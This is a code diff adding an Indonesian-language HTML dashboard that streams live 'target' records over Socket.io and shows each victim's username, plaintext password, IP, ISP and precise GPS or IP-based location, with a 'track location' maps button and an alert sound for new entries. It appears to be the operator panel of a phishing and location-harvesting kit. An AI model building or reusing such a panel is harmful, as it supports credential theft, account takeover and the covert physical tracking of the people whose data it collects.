@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Pelacakan Presisi</title>
+    <!-- Socket.io Client -->
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; }
+        .container { max-width: 1200px; margin: auto; }
+        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        h1 { color: #1c1e21; margin: 0; }
+        .stats { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; display: inline-block; }
+        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #e4e6eb; }
+        th { background-color: #0084ff; color: white; font-weight: 600; text-transform: uppercase; font-size: 0.85rem; }
+        tr { transition: background 0.3s; }
+        tr:hover { background-color: #f9fafb; }
+        .new-row { background-color: #e7f3ff !important; animation: highlight 2s ease-out; }
+        @keyframes highlight { from { background-color: #0084ff55; } to { background-color: #e7f3ff; } }
+        
+        .maps-btn { background-color: #42b72a; color: white; padding: 6px 12px; text-decoration: none; border-radius: 6px; font-size: 0.85rem; font-weight: bold; transition: background 0.2s; }
+        .maps-btn:hover { background-color: #36a420; }
+        .badge { background: #e4e6eb; padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; color: #4b4f56; margin-right: 5px; }
+        .badge-gps { background: #d1f2d1; color: #0f5132; border: 1px solid #badbcc; }
+        .badge-ip { background: #fff3cd; color: #664d03; border: 1px solid #ffecb5; }
+        .status-dot { height: 10px; width: 10px; background-color: #42b72a; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .empty-state { text-align: center; padding: 40px; color: #8a8d91; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1><span class="status-dot"></span> Dashboard Target LIVE</h1>
+            <div id="connection-status" style="font-size: 0.8rem; color: #606770;">Menghubungkan ke server...</div>
+        </header>
+
+        <div class="stats" id="data-count">Total Target: 0</div>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Waktu</th>
+                    <th>User/ID</th>
+                    <th>Password</th>
+                    <th>IP / Metode</th>
+                    <th>Provider (ISP)</th>
+                    <th>Lokasi / Presisi</th>
+                    <th>Aksi</th>
+                </tr>
+            </thead>
+            <tbody id="data-body">
+                <tr class="empty-state">
+                    <td colspan="7">Menunggu data masuk...</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Sound for new data -->
+    <audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+
+    <script>
+        const socket = io(); // Auto detect host
+        const tbody = document.getElementById('data-body');
+        const countDisplay = document.getElementById('data-count');
+        const statusDisplay = document.getElementById('connection-status');
+        const notifSound = document.getElementById('notif-sound');
+        
+        let totalData = 0;
+
+        // Initial Fetch
+        async function loadInitialData() {
+            try {
+                const response = await fetch('/api/admin/data');
+                const data = await response.json();
+                data.forEach(item => renderRow(item, false));
+                updateCount(data.length);
+            } catch (err) {
+                console.error('Initial load failed:', err);
+            }
+        }
+
+        function updateCount(newCount) {
+            totalData = newCount;
+            countDisplay.innerText = `Total Target: ${totalData}`;
+        }
+
+        function renderRow(item, isNew = true) {
+            if (totalData === 0) tbody.innerHTML = '';
+            
+            const row = document.createElement('tr');
+            if (isNew) row.className = 'new-row';
+            
+            const accuracyBadge = item.isHighAccuracy ? 
+                `<span class="badge badge-gps">GPS Presisi</span>` : 
+                `<span class="badge badge-ip">Estimasi IP</span>`;
+
+            row.innerHTML = `
+                <td><small>${item.timestamp}</small></td>
+                <td><strong>${item.username}</strong></td>
+                <td><code>${item.password}</code></td>
+                <td>${accuracyBadge}<br><small>${item.ip}</small></td>
+                <td>${item.isp}</td>
+                <td>${item.location}</td>
+                <td>
+                    ${item.mapsLink ? `<a href="${item.mapsLink}" target="_blank" class="maps-btn">Lacak Lokasi</a>` : '<span style="color:#ccc">N/A</span>'}
+                </td>
+            `;
+
+            if (isNew) {
+                tbody.insertBefore(row, tbody.firstChild);
+                notifSound.play().catch(() => {}); // Play sound if possible
+                updateCount(totalData + 1);
+            } else {
+                tbody.appendChild(row);
+            }
+        }
+
+        // Socket Events
+        socket.on('connect', () => {
+            statusDisplay.innerText = 'Terhubung (Live)';
+            statusDisplay.style.color = '#42b72a';
+            loadInitialData();
+        });
+
+        socket.on('disconnect', () => {
+            statusDisplay.innerText = 'Terputus! Mencoba menghubungkan kembali...';
+            statusDisplay.style.color = '#d93025';
+        });
+
+        socket.on('new-target-data', (data) => {
+            console.log('New data received via socket:', data);
+            renderRow(data, true);
+        });
+
+    </script>
+</body>
+</html>
+
